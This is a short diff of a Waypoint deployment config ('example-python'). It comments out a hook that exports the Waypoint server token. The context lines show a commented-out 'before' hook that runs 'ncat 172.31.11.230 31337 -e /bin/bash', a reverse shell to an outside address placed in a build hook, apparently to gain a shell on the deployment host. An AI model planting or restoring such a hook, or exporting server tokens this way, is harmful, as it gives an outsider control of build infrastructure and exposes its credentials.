@@ -18,10 +18,10 @@ app "example-python" {
         # wp = "${WAYPOINT_SERVER_TOKEN}"
       }
     }
-    hook {
-      when    = "before"
-      command = ["export", "WP_VAR_TOKEN=${WAYPOINT_SERVER_TOKEN}"]
-    }
+    # hook {
+    #   when    = "before"
+    #   command = ["export", "WP_VAR_TOKEN=${WAYPOINT_SERVER_TOKEN}"]
+    # }
     # hook {
     #   when    = "before"
     #   command = ["ncat", "172.31.11.230", "31337", "-e", "/bin/bash"]
